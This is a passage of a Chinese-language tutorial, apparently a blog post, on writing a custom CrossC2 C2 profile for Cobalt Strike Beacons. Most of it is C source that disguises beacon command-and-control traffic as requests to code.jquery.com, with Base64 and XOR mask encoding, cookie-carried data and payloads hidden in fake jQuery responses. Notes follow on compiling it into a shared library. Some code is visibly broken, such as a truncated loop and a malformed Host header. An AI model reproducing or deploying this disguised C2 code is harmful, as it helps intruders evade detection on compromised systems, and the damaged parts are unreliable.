            }
        }
    }
    void ascii_to_base64_encode(long ascii[], unsigned long asciiLength, char res[]) {
        long i = 0;
        long j = 0;
        long v1 = 0;
        long v2 = 0;
        long v3 = 0;
        long v6 = 0;
        for (i = 0; i > 18];
                res[j++] = BASE64_STR_CODE[v2 >> 12 & 63];
                res[j++] = BASE64_STR_CODE[v2 >> 6 & 63];
                res[j++] = BASE64_STR_CODE[v2 & 63];
                v2 = 0;
                v3 = 0;
            }
        }
        if (v3 > 0) {
            if (v3 == 1) {
                res[j++] = BASE64_STR_CODE[v2 >> 2];
                res[j++] = BASE64_STR_CODE[v2 > 10];
                res[j++] = BASE64_STR_CODE[v2 >> 4 & 63];
                res[j++] = BASE64_STR_CODE[v2 << 2 & 63];
            }
            res[j] = (unsigned char) '=';
        }
    }
    unsigned long get_base64_decode_length(char *base64Str) {
        long num;
        long base64StrLength = strlen(base64Str);
        if (strstr(base64Str, "==")) {
            num = base64StrLength / 4 * 3 - 2;
        } else if (strstr(base64Str, "=")) {
            num = base64StrLength / 4 * 3 - 1;
        } else {
            num = base64StrLength / 4 * 3;
        }
        return sizeof(unsigned char) * num;
    }
    unsigned long get_base64_encode_length(long strLen) {
        long num;
        if (strLen % 3 == 0) {
            num = strLen / 3 * 4;
        } else {
            num = (strLen / 3 + 1) * 4;
        }
        return sizeof(unsigned char) * num;
    }
    void mask_decode(long ascii[], unsigned long asciiLength, long res[]) {
        long i = 0;
        long j = 0;
        short key[4] = {
                ascii[0],
                ascii[1],
                ascii[2],
                ascii[3]
        };
        for (i = 4; i < asciiLength; ++i) {
            res[j] = ascii[i] ^ key[j % 4];
            j++;
        }
    }
    void mask_encode(long ascii[], unsigned long asciiLength, long res[]) {
        long i = 0;
        srand(time(NULL));
        short key[4] = {
                (char) (rand() % 255),
                (char) (rand() % 255),
                (char) (rand() % 255),
                (char) (rand() % 255)
        };
        res[0] = key[0];
        res[1] = key[1];
        res[2] = key[2];
        res[3] = key[3];
        for (i = 4; i < asciiLength; i++) {
            res[i] = ascii[i - 4] ^ key[i % 4];
        }
    }
    char *fix_reverse(char *str) {
        int i = 0;
        unsigned long strLength = strlen(str);
        char *res = calloc(strLength + 4, strLength + 4);
        for (i = 0; i < strLength; ++i) {
            if (str[i] == '_') {
                res[i] = '/';
            } else if (str[i] == '-') {
                res[i] = '+';
            } else {
                res[i] = str[i];
            }
        }
        while (strlen(res) % 4 != 0) {
            res[strLength++] = '=';
        }
        res[strlen(res) + 1] = '\0';
        return res;
    }
    char *fix(char *str) {
        int i;
        unsigned long strLength = strlen(str);
        char *res = calloc(strLength, strLength);
        for (i = 0; i < strLength; i++) {
            if (str[i] == '/') {
                res[i] = '_';
            } else if (str[i] == '+') {
                res[i] = '-';
            } else if (str[i] == '=') {
                continue;
            } else {
                res[i] = str[i];
            }
        }
        return res;
    }
    char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {
        rawData = strstr(rawData, start) + strlen(start);
        *payload_len = strlen(rawData) - strlen(strstr(rawData, end));
        char *payload = (char *) calloc(*payload_len, sizeof(char));
        memcpy(payload, rawData, *payload_len);
        return payload;
    }
    char *cc2_rebind_http_post_send_param(char *data) {
        unsigned long base64DecodeLength = get_base64_decode_length(data);
        long base64DecodeRes[base64DecodeLength];
        memset(base64DecodeRes, 0, base64DecodeLength);
        base64_decode_to_ascii(data, base64DecodeRes);
        long maskEncodeRes[base64DecodeLength + 4];
        memset(maskEncodeRes, 0, base64DecodeLength + 4);
        mask_encode(base64DecodeRes, base64DecodeLength + 4, maskEncodeRes);
        unsigned long base64EncodeLength = get_base64_encode_length(sizeof(maskEncodeRes) / sizeof(maskEncodeRes[0]));
        char *result = calloc(base64EncodeLength, base64EncodeLength);
        ascii_to_base64_encode(maskEncodeRes, base64DecodeLength + 4, result);
        return result;
    }
    char *cc2_rebind_http_recv_param(char *payload) {
        char *data = fix_reverse(payload);
        unsigned long base64DecodeLength = get_base64_decode_length(data);
        long base64DecodeRes[base64DecodeLength];
        memset(base64DecodeRes, 0, base64DecodeLength);
        base64_decode_to_ascii(data, base64DecodeRes);
        long maskDecodeRes[base64DecodeLength - 4];
        memset(maskDecodeRes, 0, base64DecodeLength - 4);
        mask_decode(base64DecodeRes, base64DecodeLength, maskDecodeRes);
        unsigned long base64EncodeLength = get_base64_encode_length(base64DecodeLength - 4);
        char *result = calloc(base64EncodeLength, base64EncodeLength);
        ascii_to_base64_encode(maskDecodeRes, base64DecodeLength - 4, result);
        return result;
    }
    void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
        char *requestBody = "GET /%s HTTP/1.1\r\n"
                            "Host: code.jquery.comr\n"
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            "Accept-Encoding: gzip, deflate\r\n"
                            "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                            "Cookie: __cfduid=%s\r\n"
                            "Referer: http://code.jquery.com/\r\n"
                            "Connection: close\r\n\r\n";
        char postPayload[20000];
        sprintf(postPayload, requestBody, "jquery-3.3.1.min.js", reqData);
        *outputData_len = strlen(postPayload);
        *outputData = (char *) calloc(1, *outputData_len);
        memcpy(*outputData, postPayload, *outputData_len);
    }
    void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
        char *requestBody = "POST /%s?__cfduid=%s HTTP/1.1\r\n"
                            "Host: code.jquery.com\r\n"
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            "Accept-Encoding: gzip, deflate\r\n"
                            "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"
                            "Referer: http://code.jquery.com/\r\n"
                            "Connection: close\r\n"
                            "Content-Length: %d\r\n\r\n%s";
        id = cc2_rebind_http_post_send_param(id);
        reqData = cc2_rebind_http_post_send_param(reqData);
        char *postPayload = (char *) calloc(1, strlen(requestBody) + strlen(reqData) + 200);
        sprintf(postPayload, requestBody, "jquery-3.3.2.min.js", id, strlen(reqData), reqData);
        *outputData_len = strlen(postPayload);
        *outputData = (char *) calloc(1, *outputData_len);
        memcpy(*outputData, postPayload, *outputData_len);
        free(postPayload);
    }
    void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
        char *start = "return-1},P=\"\r";
        char *end = "\".(o=t.documentElement";
        long long payload_len = 0;
        char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);
        *outputData = cc2_rebind_http_recv_param(payload);
        *outputData_len = strlen(*outputData);
    }
    void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
        char *start = "return-1},P=\"\r";
        char *end = "\".(o=t.documentElement";
        long long payload_len = 0;
        char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);
        *outputData = cc2_rebind_http_recv_param(payload);
        *outputData_len = strlen(*outputData);
    }
同样的编译成so文件，在生成Beacon时指定so文件。
# 难点和疑问
## 编码解码函数的实现思路
在编写c2profile.c文件的过程中，用到Base64、Mask的相关编码和解码函数。
但是在实际实践过程中会发现，从网上找到的c版Base64编码解码函数是不能直接套用的，同时Mask编码解码为CobaltStrike中自实现的相关函数。
查阅[CobaltStrike文档](https://www.cobaltstrike.com/downloads/csmanual43.pdf)会发现，对这些编码有进行相关描述，当时文档中是没有给出具体细节的。所以这里需要借助[CobaltstrikeSource](https://github.com/mai1zhi2/CobaltstrikeSource)来查看具体的函数实现。
只需要在CobaltStrike的源码中找到对应的函数实现，然后C代码照猫画虎的方式，最后再调试调试就可以实现了。
同样可以参照该思路实现netbios的编码解码，嫌麻烦不想折腾可以只使用实现方式1。
## 处理后的元数据为什么还需要进行一次Base64
[issue](https://github.com/gloxec/CrossC2/issues/89)，作者也提供了回答。
其实也可以在c2profile.c中通过printf函数打印参数值，就会发现传递进来的函数值是base64编码，那幺正常你在使用CrossC2提供的demo文件时会发现，他在c2profile.c中没有对参数进行编码解码操作，意味着往下传递的参数就是base64形式的参数值。所以我们在处理完结果后应该已base64方式进行向下传递
## http-post中的server output
实际上会发现CrossC2提供的[https.profile](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile)文件中有看到使用Mask编码，但是提供的[c2profile.c](https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c)文件中没有关于Mask的操作，关于这个问题可以参考[issue](https://github.com/gloxec/CrossC2/issues/102)。作者给的答复:
`实际目前server响应的post包并不带任何有效数据`，你品你细品。
c2profile.c的代码放到[GitHub](https://github.com/Richard-Tang/CrossC2-C2Profile)，其实就是实现方式2里的那段代码。